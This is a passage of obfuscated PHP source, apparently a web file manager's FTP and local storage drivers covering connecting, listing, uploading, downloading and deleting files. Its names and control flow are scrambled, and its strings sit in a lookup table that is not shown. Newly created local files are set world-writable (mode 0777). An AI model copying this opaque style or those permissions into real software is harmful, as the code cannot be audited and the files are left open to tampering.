$d¿Ï·±°ñ[$a°Ñ³±œÀ[1242]]) { $this->systemCharset = $d¿Ï·±°ñ[$a°Ñ³±œÀ[1242]]; } } public function iconvApp($a‘ÀªÖÊ¦™) { return $this->iconvTo($a‘ÀªÖÊ¦™, $this->systemCharset, $this->appCharset); } public function iconvSystem($D¸›ïé´Ñ) { return $this->iconvTo($D¸›ïé´Ñ, $this->appCharset, $this->systemCharset); } public function getPathOuter($F“ÏÆÄ£¤) { goto a¦÷½ˆ»¤Å; BÔÙÙäÆŒ: $F“ÏÆÄ£¤ = KodIO::clear($F“ÏÆÄ£¤); $F“ÏÆÄ£¤ = substr($F“ÏÆÄ£¤, strlen($BöñÃÄ¾Â†)); if (empty($this->pathDriver)) { return $F“ÏÆÄ£¤; } goto E‹¹Âó¯©Ë; a¦÷½ˆ»¤Å: $fÛí¬ñ®Áİ =& $_SERVER[Ç³Íß¦Ó]; $BöñÃÄ¾Â† = $this->iconvApp($this->pathBase); $F“ÏÆÄ£¤ = $this->iconvApp($F“ÏÆÄ£¤); goto fÀƒÁÜ”„˜; E‹¹Âó¯©Ë: return $this->pathDriver . $fÛí¬ñ®Áİ[8] . ltrim($F“ÏÆÄ£¤, $fÛí¬ñ®Áİ[8]); goto Có«÷Ï‰ª; fÀƒÁÜ”„˜: if (substr($BöñÃÄ¾Â†, 0, 2) == $fÛí¬ñ®Áİ[1243]) { $BöñÃÄ¾Â† = BASIC_PATH . substr($BöñÃÄ¾Â†, 2); } if (substr($F“ÏÆÄ£¤, 0, 2) == $fÛí¬ñ®Áİ[1243]) { $F“ÏÆÄ£¤ = BASIC_PATH . substr($F“ÏÆÄ£¤, 2); } $BöñÃÄ¾Â† = KodIO::clear($BöñÃÄ¾Â†); goto BÔÙÙäÆŒ; Có«÷Ï‰ª: } private function _init($AÂ’ÂÇ ÙÔ = array()) { $A‹¼ŸÊÛâ¿ =& $_SERVER[Ç³Íß¦Ó]; if (!function_exists($A‹¼ŸÊÛâ¿[1244])) { throw new Exception(LNG($A‹¼ŸÊÛâ¿[1245])); } $this->config = $AÂ’ÂÇ ÙÔ; $this->charsetReset($AÂ’ÂÇ ÙÔ); foreach ($AÂ’ÂÇ ÙÔ as $Eˆö·Ô•Ì¬ => $DÖ¨ôÅˆ‡«) { if (isset($this->{$Eˆö·Ô•Ì¬})) { $this->{$Eˆö·Ô•Ì¬} = $DÖ¨ôÅˆ‡«; } } return $this->_login($AÂ’ÂÇ ÙÔ); } private function _login($eÆ‹äÓÜ¼ê) { goto f†ˆ·ØÎ÷„; fÛ¿µ¶œİö: $Fè óÔ—ÎÁ[$föåÑŒ™³] = array($a™ä°ÆËš†[1249] => $this->connect, $a™ä°ÆËš†[175] => $this->host, $a™ä°ÆËš†[174] => $this->scheme, $a™ä°ÆËš†[176] => $this->port); return $fÃ°Ü¿ª‰¨; goto B­´×Ì÷ßá; aÖìßÖš”Ê: $fÑÆ„‚Ì = isset($D¾“èõáé[$a™ä°ÆËš†[174]]) && $D¾“èõáé[$a™ä°ÆËš†[174]] == $a™ä°ÆËš†[1246] ? !0 : !1; $this->scheme = $fÑÆ„‚Ì ? $a™ä°ÆËš†[1247] : $a™ä°ÆËš†[1248]; $this->port = isset($D¾“èõáé[$a™ä°ÆËš†[176]]) ? $D¾“èõáé[$a™ä°ÆËš†[176]] : 21; goto b«ˆáîæÒß; b«ˆáîæÒß: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $fÃ°Ü¿ª‰¨ = @ftp_login($this->connect, $this->username, $this->userpass); goto b¬ù§¡ŸÀï; f†ˆ·ØÎ÷„: $a™ä°ÆËš† =& $_SERVER[Ç³Íß¦Ó]; static $Fè óÔ—ÎÁ = array(); $föåÑŒ™³ = md5(json_encode($eÆ‹äÓÜ¼ê)); goto cÁ‘Å½·ÖÃ; b¬ù§¡ŸÀï: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Fî…õ‰ÜÜğ = $this->pasv == $a™ä°ÆËš†[87] ? !0 : !1; @ftp_pasv($this->connect, $Fî…õ‰ÜÜğ); goto fÛ¿µ¶œİö; cÁ‘Å½·ÖÃ: if (isset($Fè óÔ—ÎÁ[$föåÑŒ™³])) { foreach ($Fè óÔ—ÎÁ[$föåÑŒ™³] as $BÈÑŸï‹†ç => $eì†ÅÃâ×) { $this->{$BÈÑŸï‹†ç} = $eì†ÅÃâ×; } return !0; } $D¾“èõáé = parse_url(trim($this->server, $a™ä°ÆËš†[8])); $this->host = $D¾“èõáé[$a™ä°ÆËš†[175]]; goto aÖìßÖš”Ê; B­´×Ì÷ßá: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($E•£¯ŠÃÖ, $A¾º¼ÇÆ™˜ = '', $EÑ‘×«Ä»… = REPEAT_RENAME) { if ($this->setContent($E•£¯ŠÃÖ, $A¾º¼ÇÆ™˜)) { return $this->getPathOuter($E•£¯ŠÃÖ); } return !1; } public function mkdir($e‘­¡ÎòÏ, $d‹œáÊ±§© = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $e‘­¡ÎòÏ = $this->iconvSystem($e‘­¡ÎòÏ); if ($this->_isFolder($e‘­¡ÎòÏ) || @ftp_mkdir($this->connect, $e‘­¡ÎòÏ)) { return $this->getPathOuter($e‘­¡ÎòÏ); } if (!$this->mkdir($this->pathFather($e‘­¡ÎòÏ))) { return !1; } if ($e‘­¡ÎòÏ = @ftp_mkdir($this->connect, $e‘­¡ÎòÏ)) { return $this->getPathOuter($e‘­¡ÎòÏ); } return !1; } public function copyFile($Cœ–ÖÓÊ®‡, $DÙ»ŠæÂ¡è) { goto cˆò‰¬÷ò»; e»Áºµ‰ãè: $this->tempFileRemve($D‡ƒ²ó äë); return $f‡‹øù¯“ä; goto BéÔíËø…†; cˆò‰¬÷ò»: if (!$this->_isconn()) { return !1; } $A¼Ú±³‚µ = $this->pathThis($this->iconvSystem($Cœ–ÖÓÊ®‡)); $D‡ƒ²ó äë = $this->tempFile($A¼Ú±³‚µ); goto dÃ®äÙŞ×Ç; dÃ®äÙŞ×Ç: $AãÑŠè¸ªè = $this->iconvApp($D‡ƒ²ó äë); $this->download($Cœ–ÖÓÊ®‡, $AãÑŠè¸ªè); $f‡‹øù¯“ä = $this->upload($DÙ»ŠæÂ¡è, $AãÑŠè¸ªè); goto e»Áºµ‰ãè; BéÔíËø…†: } public function moveFile($Cµ²¡¥‰¢, $E”œÙ±¡×‰) { if (!$this->_isconn()) { return !1; } $Cµ²¡¥‰¢ = $this->iconvSystem($Cµ²¡¥‰¢); $E”œÙ±¡×‰ = $this->iconvSystem($E”œÙ±¡×‰); $C¸î×Óáø = @ftp_rename($this->connect, $Cµ²¡¥‰¢, $E”œÙ±¡×‰); return $C¸î×Óáø ? $this->getPathOuter($E”œÙ±¡×‰) : !1; } public function delFile($C´òŠò°—) { if (!$this->_isconn()) { return !1; } $C´òŠò°— = $this->iconvSystem($C´òŠò°—); return @ftp_delete($this->connect, $C´òŠò°—); } public function delFolder($CÜ÷·Ğ†ñ) { goto b¢ŠƒÍÒ; b¢ŠƒÍÒ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $bÆˆÀ¨½Ô = $féŠÒª—°¬ = array(); goto c‚æÅºŠ; EãÜõÒƒö£: foreach ($bÆˆÀ¨½Ô as $dòÒ„±’Æ) { $dòÒ„±’Æ = $this->iconvSystem($dòÒ„±’Æ); $a•ªÜÏ§Š = @ftp_rmdir($this->connect, $dòÒ„±’Æ); if (!$a•ªÜÏ§Š) { return !1; } } $CÜ÷·Ğ†ñ = $this->iconvSystem($CÜ÷·Ğ†ñ); return @ftp_rmdir($this->connect, $CÜ÷·Ğ†ñ); goto f¸‰ÖÑ®¤Õ; c‚æÅºŠ: $this->fileList($CÜ÷·Ğ†ñ, $bÆˆÀ¨½Ô, $féŠÒª—°¬, !0); $this->listItemCache = !0; foreach ($féŠÒª—°¬ as $bÈ²§ŞÚó) { $dòÒ„±’Æ = $this->iconvSystem($bÈ²§ŞÚó[$_SERVER[Ç³Íß¦Ó][28]]); $a•ªÜÏ§Š = @ftp_delete($this->connect, $dòÒ„±’Æ); if (!$a•ªÜÏ§Š) { return !1; } } goto EãÜõÒƒö£; f¸‰ÖÑ®¤Õ: } public function rename($CåÙŞ´º…Ö, $däî°º¼Šê) { goto C©†áÛœ­; C«÷íÇÌò™: $d„¡ÆÑ§ŞÄ = rtrim($a¨Ç¥¸¨Ô, $Bªùã£¸©¾[8]) . $Bªùã£¸©¾[8] . $b½äÂÚ„’; $dŸØÀ’õï  = @ftp_rename($this->connect, $CåÙŞ´º…Ö, $d„¡ÆÑ§ŞÄ); $d„¡ÆÑ§ŞÄ = $this->iconvApp($d„¡ÆÑ§ŞÄ); goto eà˜ç‘—ÂÃ; eà˜ç‘—ÂÃ: return $dŸØÀ’õï  ? $this->getPathOuter($d„¡ÆÑ§ŞÄ) : !1; goto fŸ±£“Û½å; C©†áÛœ­: $Bªùã£¸©¾ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->_isconn()) { return !1; } $b½äÂÚ„’ = $this->fileNameAuto($this->pathFather($CåÙŞ´º…Ö), $däî°º¼Šê); goto e‘÷´öÌë ; e‘÷´öÌë : $b½äÂÚ„’ = $this->iconvSystem($b½äÂÚ„’); $CåÙŞ´º…Ö = $this->iconvSystem($CåÙŞ´º…Ö); $a¨Ç¥¸¨Ô = $this->pathFather($CåÙŞ´º…Ö); goto C«÷íÇÌò™; fŸ±£“Û½å: } private function folderInfo($dä¨Î‡ïÍö, $f¿ùŠóĞÎõ = false) { $f‹î“øÉß =& $_SERVER[Ç³Íß¦Ó]; $F¤òŠà”’ = array($f‹î“øÉß[28] => $this->pathThis($dä¨Î‡ïÍö), $f‹î“øÉß[76] => $this->getPathOuter($f‹î“øÉß[8] . $dä¨Î‡ïÍö), $f‹î“øÉß[29] => $f‹î“øÉß[77]); if ($f¿ùŠóĞÎõ) { return $F¤òŠà”’; } $F¤òŠà”’[$f‹î“øÉß[193]] = $F¤òŠà”’[$f‹î“øÉß[84]] = 0; $F¤òŠà”’[$f‹î“øÉß[194]] = $F¤òŠà”’[$f‹î“øÉß[195]] = !0; return $F¤òŠà”’; } private function fileInfo($A¹ÑóÙÁá, $D÷âø„ÎÏ = false, $a¢”÷èó¢¶ = array()) { goto d„ß³öàÉ; B‹åæÎ‚Â: $c‚§åø¡[$F¢äŒß¹¦¡[84]] = @ftp_mdtm($this->connect, $béÌâ××«™); if (empty($a¢”÷èó¢¶)) { $a¢”÷èó¢¶ = $this->objectMeta($A¹ÑóÙÁá); if (!$a¢”÷èó¢¶) { return $c‚§åø¡; } } $c‚§åø¡[$F¢äŒß¹¦¡[78]] = $a¢”÷èó¢¶[$F¢äŒß¹¦¡[78]]; goto C¦—‹êíåØ; B©ˆ¼ãÆİ²: $c‚§åø¡[$F¢äŒß¹¦¡[193]] = $c‚§åø¡[$F¢äŒß¹¦¡[84]] = 0; $c‚§åø¡[$F¢äŒß¹¦¡[194]] = $c‚§åø¡[$F¢äŒß¹¦¡[195]] = !0; $béÌâ××«™ = $this->iconvSystem($A¹ÑóÙÁá); goto B‹åæÎ‚Â; d„ß³öàÉ: $F¢äŒß¹¦¡ =& $_SERVER[Ç³Íß¦Ó]; $c‚§åø¡ = array($F¢äŒß¹¦¡[28] => $this->pathThis($A¹ÑóÙÁá), $F¢äŒß¹¦¡[76] => $this->getPathOuter($F¢äŒß¹¦¡[8] . $A¹ÑóÙÁá), $F¢äŒß¹¦¡[29] => $F¢äŒß¹¦¡[192], $F¢äŒß¹¦¡[78] => isset($a¢”÷èó¢¶[$F¢äŒß¹¦¡[78]]) ? $a¢”÷èó¢¶[$F¢äŒß¹¦¡[78]] : 0, $F¢äŒß¹¦¡[168] => $this->ext($A¹ÑóÙÁá)); if ($D÷âø„ÎÏ) { return $c‚§åø¡; } goto B©ˆ¼ãÆİ²; C¦—‹êíåØ: return $c‚§åø¡; goto Eè’™¦Ÿ„‘; Eè’™¦Ÿ„‘: } public function size($Dø‰Ö‡¨œí) { $eª“œ“…î = $this->objectMeta($Dø‰Ö‡¨œí); return $eª“œ“…î ? $eª“œ“…î[$_SERVER[Ç³Íß¦Ó][78]] : 0; } public function info($c˜Ø–™ø‹ƒ) { if ($this->isFile($c˜Ø–™ø‹ƒ)) { return $this->fileInfo($c˜Ø–™ø‹ƒ, 0); } else { if ($this->isFolder($c˜Ø–™ø‹ƒ)) { return $this->folderInfo($c˜Ø–™ø‹ƒ); } } return !1; } private function fileList($BÀ“É©óÇ–, &$B»÷’ç—Ä¦, &$C«ÉßõÆ®é, $FÇà¬Ÿšåè = false) { goto cæãÁ¨×æÑ; dô×ÈŠì•à: @ftp_chdir($this->connect, $b¿©Ô‹Œ™ä[8]); $BÀ“É©óÇ– = rtrim($BÀ“É©óÇ–, $b¿©Ô‹Œ™ä[8]) . $b¿©Ô‹Œ™ä[8]; check_abort(); goto B¸ñÁĞš•; cæãÁ¨×æÑ: $b¿©Ô‹Œ™ä =& $_SERVER[Ç³Íß¦Ó]; $BÀ“É©óÇ– = $this->iconvSystem($BÀ“É©óÇ–); if (!$this->isFolder($BÀ“É©óÇ–)) { return !1; } goto dô×ÈŠì•à; B·¦†»Å: $dš×ãº¼³à = array($b¿©Ô‹Œ™ä[95] => 1, $b¿©Ô‹Œ™ä[1250] => 1); foreach ($EáŠËÄ¸Ãë as $CŠä­†ˆ™í) { goto E¨¶˜´¶ Â; E¨¶˜´¶ Â: $B°ó°Å¡ é = $this->_listItem($CŠä­†ˆ™í); if ($B°ó°Å¡ é[0] == $b¿©Ô‹Œ™ä[720]) { continue; } $D×¬ñá¯î› = $B°ó°Å¡ é[8]; goto FÌ›É³é‚ä; F‚ùˆ½¹Ì‚: if (substr($CŠä­†ˆ™í, 0, 1) == $b¿©Ô‹Œ™ä[1251]) { $BùšñĞ»«Û[$b¿©Ô‹Œ™ä[29]] = $b¿©Ô‹Œ™ä[77]; $BùšñĞ»«Û[$b¿©Ô‹Œ™ä[78]] = 0; } $CÔ¤­Õº±è = $BùšñĞ»«Û[$b¿©Ô‹Œ™ä[29]] == $b¿©Ô‹Œ™ä[77] ? !0 : !1; if ($F¤¦ÈêÕ”£) { $this->cacheMethod($b¿©Ô‹Œ™ä[198], $D×¬ñá¯î›, $CÔ¤­Õº±è); $this->cacheMethod($b¿©Ô‹Œ™ä[199], $D×¬ñá¯î›, $BùšñĞ»«Û); } goto aÎ‘×º˜Şî; aÎ‘×º˜Şî: if ($CÔ¤­Õº±è) { $B»÷’ç—Ä¦[] = $D×¬ñá¯î›; if ($FÇà¬Ÿšåè) { $this->fileList($D×¬ñá¯î›, $B»÷’ç—Ä¦, $C«ÉßõÆ®é, $FÇà¬Ÿšåè); } continue; } $C«ÉßõÆ®é[] = $BùšñĞ»«Û; goto e©„»“ÏÆ; FÌ›É³é‚ä: if (!$D×¬ñá¯î› || isset($dš×ãº¼³à[$D×¬ñá¯î›])) { continue; } $D×¬ñá¯î› = $this->iconvApp($BÀ“É©óÇ– . ltrim($D×¬ñá¯î›, $b¿©Ô‹Œ™ä[8])); $BùšñĞ»«Û = array($b¿©Ô‹Œ™ä[28] => $D×¬ñá¯î›, $b¿©Ô‹Œ™ä[29] => $b¿©Ô‹Œ™ä[192], $b¿©Ô‹Œ™ä[78] => $B°ó°Å¡ é[4]); goto F‚ùˆ½¹Ì‚; e©„»“ÏÆ: } if ($F¤¦ÈêÕ”£) { $this->cacheMethod($b¿©Ô‹Œ™ä[198], $BÀ“É©óÇ–, !0); } goto D´Ò¥Î“ˆ; B¸ñÁĞš•: $F¤¦ÈêÕ”£ = $this->listItemCache === !1 ? !1 : !0; $EáŠËÄ¸Ãë = @ftp_rawlist($this->connect, $BÀ“É©óÇ–); if (!$EáŠËÄ¸Ãë) { $EáŠËÄ¸Ãë = array(); } goto B·¦†»Å; D´Ò¥Î“ˆ: } private function _listItem($bÎœÇ‰–°) { if (empty($bÎœÇ‰–°)) { return array(); } $d‰‚…ÎœÃÎ = preg_split($_SERVER[Ç³Íß¦Ó][1252], $bÎœÇ‰–°); if (count($d‰‚…ÎœÃÎ) <= 9) { return $d‰‚…ÎœÃÎ; } $d‰‚…ÎœÃÎ[8] = trim(substr($bÎœÇ‰–°, strpos($bÎœÇ‰–°, $d‰‚…ÎœÃÎ[7]) + strlen($d‰‚…ÎœÃÎ[7]))); return array_splice($d‰‚…ÎœÃÎ, 0, 9); } public function listPath($côºÔ†‰, $DÀ¼ê„½‚ò = false) { goto e¤ùŒÀÖİ; D–îÕ®²Ù©: $this->fileList($côºÔ†‰, $Dó§Âóßğô, $Eùğ‘¤îÛ‘); foreach ($Dó§Âóßğô as $F¡’œáôñí => $d™Á¡ÔÂŸã) { $Dó§Âóßğô[$F¡’œáôñí] = $this->folderInfo($d™Á¡ÔÂŸã, $DÀ¼ê„½‚ò); } foreach ($Eùğ‘¤îÛ‘ as $F¡’œáôñí => $d™Á¡ÔÂŸã) { $Eùğ‘¤îÛ‘[$F¡’œáôñí] = $this->fileInfo($d™Á¡ÔÂŸã[$c×†ìÈğ™é[28]], $DÀ¼ê„½‚ò, $d™Á¡ÔÂŸã); } goto B²È¬×ª; B²È¬×ª: return array($c×†ìÈğ™é[75] => $Dó§Âóßğô, $c×†ìÈğ™é[74] => $Eùğ‘¤îÛ‘); goto aôÜ…­ä; e¤ùŒÀÖİ: $c×†ìÈğ™é =& $_SERVER[Ç³Íß¦Ó]; if (!$this->_isconn()) { return !1; } $Dó§Âóßğô = $Eùğ‘¤îÛ‘ = array(); goto D–îÕ®²Ù©; aôÜ…­ä: } public function has($c“’‰Œ¨íŠ, $DŞ±ÆŠ§ğ = false, $BÍß‰¿Œù‘ = true) { goto a÷®×§¤‹; EéÖ³‹áŒ: $this->fileList($c“’‰Œ¨íŠ, $E•œÁÜŞÀ‹, $d’½ù½âæÊ, $AøØ©ˆµ¼Ô); if ($DŞ±ÆŠ§ğ) { return array($dà·¤¨¤ñ[202] => count($d’½ù½âæÊ), $dà·¤¨¤ñ[203] => count($E•œÁÜŞÀ‹)); } if ($BÍß‰¿Œù‘) { if (count($d’½ù½âæÊ)) { return !0; } } else { if (count($E•œÁÜŞÀ‹)) { return !0; } } goto bˆ†¦§¨³õ; bˆ†¦§¨³õ: return !1; goto dÃÍèé¼ˆ¦; a÷®×§¤‹: $dà·¤¨¤ñ =& $_SERVER[Ç³Íß¦Ó]; $E•œÁÜŞÀ‹ = $d’½ù½âæÊ = array(); $AøØ©ˆµ¼Ô = $DŞ±ÆŠ§ğ ? !0 : !1; goto EéÖ³‹áŒ; dÃÍèé¼ˆ¦: } public function listAll($FÓƒªêß™) { goto béñÇƒ¯…Œ; F»ÖÑ’²‰®: $this->fileList($FÓƒªêß™, $eºŒ‰ù£Ø , $bøÆ…àÔÍ, !0); $fªŒÒéÆØâ = array(); foreach ($bøÆ…àÔÍ as $C±¾ô©‰º·) { $fªŒÒéÆØâ[$C±¾ô©‰º·[$f’‚İƒÖœ£[28]]] = $C±¾ô©‰º·[$f’‚İƒÖœ£[78]]; } goto BÀ’‹·¦”; BÀ’‹·¦”: foreach ($eºŒ‰ù£Ø  as $C±¾ô©‰º·) { if (is_string($C±¾ô©‰º·)) { $fªŒÒéÆØâ[$C±¾ô©‰º·] = 0; } } return $this->listAllFiles($FÓƒªêß™, array_keys($fªŒÒéÆØâ), $fªŒÒéÆØâ); goto F¤ºÖãêÚ; béñÇƒ¯…Œ: $f’‚İƒÖœ£ =& $_SERVER[Ç³Íß¦Ó]; if (!$this->_isconn()) { return !1; } $eºŒ‰ù£Ø  = $bøÆ…àÔÍ = array(); goto F»ÖÑ’²‰®; F¤ºÖãêÚ: } public function getContent($eùŠ¿ÉÈ„Š) { if (!$this->_isconn()) { return !1; } $eùŠ¿ÉÈ„Š = $this->iconvSystem($eùŠ¿ÉÈ„Š); return $this->fileSubstr($eùŠ¿ÉÈ„Š); } public function setContent($e¥¹§˜ê‚, $A‰Ù†¤îŞ… = '') { goto bç‰Ç–†Ãâ; D¡™éåØ®: file_put_contents($B°ªË˜Ù±, $A‰Ù†¤îŞ…); $cñ—ŠŸöæ¡ = $this->upload($e¥¹§˜ê‚, $this->iconvApp($B°ªË˜Ù±)); $this->tempFileRemve($B°ªË˜Ù±); goto f‚œ¦Ë•â›; bç‰Ç–†Ãâ: if (!$this->_isconn()) { return !1; } $EÉÌËì´¤ = $this->pathThis($this->iconvSystem($e¥¹§˜ê‚)); $B°ªË˜Ù± = $this->tempFile($EÉÌËì´¤); goto D¡™éåØ®; f‚œ¦Ë•â›: return $cñ—ŠŸöæ¡; goto fà˜ß‰ˆ; fà˜ß‰ˆ: } public function fileSubstr($E­§»²Ú‚˜, $DæÄ¡ÏÛ¡ = 0, $B«‰‹È²³ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($E­§»²Ú‚˜, $DæÄ¡ÏÛ¡, $B«‰‹È²³); } private function ftpRequest($C¨ñá‹â³™, $e–¤ÃÑ†Œš = 0, $F»Ü·µ“¯‘ = false) { goto eˆ¼‡¸®Òª; Aá¹“Ù¿Ë: curl_setopt($cø¦´øµ·, CURLOPT_URL, $B²£¸îÂË¯ . $this->pathEncode($C¨ñá‹â³™)); curl_setopt($cø¦´øµ·, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($F»Ü·µ“¯‘) { $AãÛ—öÁŒ = $e–¤ÃÑ†Œš + $F»Ü·µ“¯‘ - 1; curl_setopt($cø¦´øµ·, CURLOPT_RANGE, "{$e–¤ÃÑ†Œš}\x2d{$AãÛ—öÁŒ}"); } goto DŠÒ¥È‡•; DùÔÙ–‹ö: return $däóÒæ¡¯‚; goto cç‰ƒ‹ÏÄ; DŠÒ¥È‡•: curl_setopt($cø¦´øµ·, CURLOPT_RETURNTRANSFER, 1); $däóÒæ¡¯‚ = curl_exec($cø¦´øµ·); curl_close($cø¦´øµ·); goto DùÔÙ–‹ö; eˆ¼‡¸®Òª: $C¨ñá‹â³™ = $this->iconvSystem($C¨ñá‹â³™); $B²£¸îÂË¯ = $this->scheme . $this->host . $_SERVER[Ç³Íß¦Ó][4] . $this->port; $cø¦´øµ· = curl_init(); goto Aá¹“Ù¿Ë; cç‰ƒ‹ÏÄ: } public function upload($DÍ§Ú»”±¦, $DÕæğÌï÷ò, $eñÛ¨‰í›„ = false, $AŠÛï‡ƒà = REPEAT_REPLACE) { goto Aòòœà‰ˆƒ; FÃ¡Œ÷‹åİ: if ($D¥ƒ³‘ÀÌÁ != FTP_FINISHED) { return !1; } return $this->getPathOuter($DÍ§Ú»”±¦); goto cŸâ—ØíÇ¿; Aòòœà‰ˆƒ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($DÍ§Ú»”±¦))) { return !1; } $DÍ§Ú»”±¦ = $this->iconvSystem($DÍ§Ú»”±¦); goto bÑÑ™ìŒÄì; bÑÑ™ìŒÄì: $DÕæğÌï÷ò = $this->iconvSystem($DÕæğÌï÷ò); $D¥ƒ³‘ÀÌÁ = ftp_nb_put($this->connect, $DÍ§Ú»”±¦, $DÕæğÌï÷ò, FTP_BINARY); while ($D¥ƒ³‘ÀÌÁ == FTP_MOREDATA) { $D¥ƒ³‘ÀÌÁ = ftp_nb_continue($this->connect); } goto FÃ¡Œ÷‹åİ; cŸâ—ØíÇ¿: } public function download($cõ÷È§œ, $Cİ¹Ü¾õÍˆ = '') { goto f¾¥‚«ø¼±; f¾¥‚«ø¼±: if (!$this->_isconn()) { return !1; } $DàêÕöÇ±‹ = $this->pathFather($Cİ¹Ü¾õÍˆ); if (!IO::mkdir($DàêÕöÇ±‹)) { return !1; } goto A×‘ºÉ¦¥’; Dˆâ©èÎß¬: while ($E¨½å…¤è£ == FTP_MOREDATA) { $E¨½å…¤è£ = ftp_nb_continue($this->connect); } if ($E¨½å…¤è£ != FTP_FINISHED) { return !1; } return $this->iconvApp($Cİ¹Ü¾õÍˆ); goto bË…±¸ÜâÆ; A×‘ºÉ¦¥’: $cõ÷È§œ = $this->iconvSystem($cõ÷È§œ); $Cİ¹Ü¾õÍˆ = $this->iconvSystem($Cİ¹Ü¾õÍˆ); $E¨½å…¤è£ = ftp_nb_get($this->connect, $Cİ¹Ü¾õÍˆ, $cõ÷È§œ, FTP_BINARY); goto Dˆâ©èÎß¬; bË…±¸ÜâÆ: } public function exist($FÅµ§Èœô„) { return $this->isFile($FÅµ§Èœô„) || $this->isFolder($FÅµ§Èœô„); } public function isFile($c¢×‹“Êä) { return !$this->isFolder($c¢×‹“Êä) && $this->objectMeta($c¢×‹“Êä); } public function isFolder($a ÑŒÍöç§) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][198], $a ÑŒÍöç§); } protected function objectMeta($cÛÔÏ¼äØÆ) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][199], $cÛÔÏ¼äØÆ); } protected function _objectMeta($Cæ½êËœ©İ) { goto E“·éá’°”; B£»í‰µÊß: $Cæ½êËœ©İ = $this->iconvSystem($Cæ½êËœ©İ); $CÜøÙº­É = array($a‡Âì´Áß‚[28] => $this->iconvApp($Cæ½êËœ©İ), $a‡Âì´Áß‚[29] => $a‡Âì´Áß‚[192], $a‡Âì´Áß‚[78] => 0); @ftp_chdir($this->connect, $a‡Âì´Áß‚[8]); goto A…Ö•·—Ù; E“·éá’°”: $a‡Âì´Áß‚ =& $_SERVER[Ç³Íß¦Ó]; if ($Cæ½êËœ©İ == $a‡Âì´Áß‚[33] || $Cæ½êËœ©İ == $a‡Âì´Áß‚[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto B£»í‰µÊß; A…Ö•·—Ù: $CÒ§¥¹¾ = @ftp_size($this->connect, $Cæ½êËœ©İ); if ($CÒ§¥¹¾ != -1) { $CÜøÙº­É[$a‡Âì´Áß‚[78]] = $CÒ§¥¹¾; } else { $c§¼ĞÒˆˆ« = @ftp_chdir($this->connect, $Cæ½êËœ©İ); if (!$c§¼ĞÒˆˆ«) { return !1; } $CÜøÙº­É[$a‡Âì´Áß‚[29]] = $a‡Âì´Áß‚[77]; } return $CÜøÙº­É; goto dÔÍÊ“›ƒ–; dÔÍÊ“›ƒ–: } protected function _isFolder($b•«•ó‰ì) { $FÇ¸ÒÇ‚Ú’ =& $_SERVER[Ç³Íß¦Ó]; if ($b•«•ó‰ì == $FÇ¸ÒÇ‚Ú’[33] || $b•«•ó‰ì == $FÇ¸ÒÇ‚Ú’[8]) { return !0; } $f‡¦‘ÚÉŞ÷ = $this->_objectMeta($b•«•ó‰ì); return isset($f‡¦‘ÚÉŞ÷[$FÇ¸ÒÇ‚Ú’[29]]) && $f‡¦‘ÚÉŞ÷[$FÇ¸ÒÇ‚Ú’[29]] == $FÇ¸ÒÇ‚Ú’[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($f™…Ä‚¦ÈŒ) { if (substr($f™…Ä‚¦ÈŒ, 0, 2) == $_SERVER[Ç³Íß¦Ó][1243]) { $f™…Ä‚¦ÈŒ = BASIC_PATH . substr($f™…Ä‚¦ÈŒ, 2); } return $f™…Ä‚¦ÈŒ; } public function iconvApp($a¸œ‰õ©Í) { $AÍ„ÍÃÅˆ =& $_SERVER[Ç³Íß¦Ó]; global $config; return $this->iconvTo($a¸œ‰õ©Í, $config[$AÍ„ÍÃÅˆ[1241]], $config[$AÍ„ÍÃÅˆ[1240]]); } public function iconvSystem($dÕ†Â®ã¼) { $EŒ”ÄÏ©¤ñ =& $_SERVER[Ç³Íß¦Ó]; global $config; return $this->iconvTo($dÕ†Â®ã¼, $config[$EŒ”ÄÏ©¤ñ[1240]], $config[$EŒ”ÄÏ©¤ñ[1241]]); } public function getPathOuter($a¸ÙîÑ‡Şö) { goto FÃ‘İÊ®î; FÃ‘İÊ®î: $EğŞäÈ™ä =& $_SERVER[Ç³Íß¦Ó]; $Fˆİ¸ù¡…˜ = $this->iconvApp($this->pathBase); $a¸ÙîÑ‡Şö = $this->iconvApp($a¸ÙîÑ‡Şö); goto e—õ±”¿‚”; e—õ±”¿‚”: if (substr($Fˆİ¸ù¡…˜, 0, 2) == $EğŞäÈ™ä[1243]) { $Fˆİ¸ù¡…˜ = BASIC_PATH . substr($Fˆİ¸ù¡…˜, 2); } if (substr($a¸ÙîÑ‡Şö, 0, 2) == $EğŞäÈ™ä[1243]) { $a¸ÙîÑ‡Şö = BASIC_PATH . substr($a¸ÙîÑ‡Şö, 2); } $Fˆİ¸ù¡…˜ = KodIO::clear($Fˆİ¸ù¡…˜); goto Eù¡‡ÔŠë; Eù¡‡ÔŠë: $a¸ÙîÑ‡Şö = KodIO::clear($a¸ÙîÑ‡Şö); $a¸ÙîÑ‡Şö = substr($a¸ÙîÑ‡Şö, strlen($Fˆİ¸ù¡…˜)); if (empty($this->pathDriver)) { return $a¸ÙîÑ‡Şö; } goto Aí«‹¬Çˆ’; Aí«‹¬Çˆ’: return $this->pathDriver . $EğŞäÈ™ä[8] . ltrim($a¸ÙîÑ‡Şö, $EğŞäÈ™ä[8]); goto A²‡ÏÖó¨; A²‡ÏÖó¨: } public function mkfile($dĞ¸¦Øçòè, $cÆœˆâÒóà = '', $C£Çƒ“½È = REPEAT_RENAME) { $dĞ¸¦Øçòè = $this->iconvSystem($dĞ¸¦Øçòè); @touch($dĞ¸¦Øçòè); if ($cÆœˆâÒóà) { file_put_contents($dĞ¸¦Øçòè, $cÆœˆâÒóà); } @chmod($dĞ¸¦Øçòè, 511); return is_file($dĞ¸¦Øçòè) ? $this->getPathOuter($dĞ¸¦Øçòè) : !1; } public function mkdir($fœŒŸê¤Šë, $DõåÑËÕ = 